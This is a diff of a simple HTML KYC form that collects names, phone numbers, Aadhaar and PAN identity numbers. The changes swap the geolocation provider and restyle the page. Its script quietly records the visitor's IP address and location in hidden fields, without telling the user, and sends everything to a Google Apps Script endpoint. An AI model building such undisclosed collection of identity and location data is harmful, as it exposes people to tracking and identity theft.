@@ -3,67 +3,28 @@
 <head>
   <meta charset="UTF-8">
   <title>KYC Form</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f9f9f9;
-      padding: 40px;
-    }
-    form {
-      max-width: 400px;
-      margin: auto;
-      background: #fff;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    label {
-      display: block;
-      margin-top: 10px;
-    }
-    input[type="text"],
-    input[type="tel"] {
-      width: 100%;
-      padding: 8px;
-      margin-top: 4px;
-      border-radius: 4px;
-      border: 1px solid #ccc;
-    }
-    button {
-      margin-top: 20px;
-      width: 100%;
-      padding: 10px;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-  </style>
 </head>
 <body>
   <h2>KYC Form</h2>
   <form id="p2p-form">
-    <label for="name">Full Name</label>
-    <input type="text" name="name" required>
+    <label>Name:</label>
+    <input type="text" name="name" required><br><br>
 
-    <label for="phone">Phone Number</label>
-    <input type="tel" name="phone" required pattern="[0-9]{10}">
+    <label>Phone:</label>
+    <input type="tel" name="phone" required pattern="[0-9]{10}"><br><br>
 
-    <label for="aadhaar">Aadhaar Number</label>
-    <input type="text" name="aadhaar" required pattern="[0-9]{12}">
+    <label>Aadhaar:</label>
+    <input type="text" name="aadhaar" required pattern="[0-9]{12}"><br><br>
 
-    <label for="pan">PAN Number</label>
-    <input type="text" name="pan" required pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}">
+    <label>PAN:</label>
+    <input type="text" name="pan" required pattern="[A-Z]{5}[0-9]{4}[A-Z]"><br><br>
 
     <input type="hidden" name="ip">
     <input type="hidden" name="location">
 
     <button type="submit">Submit</button>
   </form>
+  <p id="msg"></p>
 
   <script>
     document.getElementById("p2p-form").addEventListener("submit", async function(e) {
@@ -71,27 +32,27 @@
       const form = e.target;
 
       try {
-        // Get IP and location
-        const ipResp = await fetch("https://ipapi.co/json/");
-        const ipInfo = await ipResp.json();
-        form.ip.value = ipInfo.ip;
-        form.location.value = `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}`;
+        // Use ipwhois.io for geolocation (no sign-up required)
+        const resp = await fetch("https://ipwhois.app/json/");
+        const info = await resp.json();
+        form.ip.value = info.ip;
+        form.location.value = `${info.city}, ${info.region}, ${info.country}`;
 
-        // Prepare FormData and send to Google Apps Script
+        // Send via FormData (no JSON)
         const fd = new FormData(form);
         const res = await fetch("https://script.google.com/macros/s/AKfycbyq7sS4rpRCnbu59SbqCcmcXm58fjQvgbMawBrLrh_LrAq5lLNGvhGNyST423Wz6anv3A/exec", {
           method: "POST",
-          body: fd,
+          body: fd
         });
 
         if (res.ok) {
-          alert("✅ Submitted successfully!");
+          document.getElementById("msg").textContent = "✅ Submitted successfully!";
           form.reset();
         } else {
-          alert("❌ Submission failed. Please try again.");
+          document.getElementById("msg").textContent = "❌ Submission failed. Try again.";
         }
       } catch (err) {
-        alert("⚠️ Error: " + err.message);
+        document.getElementById("msg").textContent = "⚠️ " + err.message;
       }
     });
   </script>
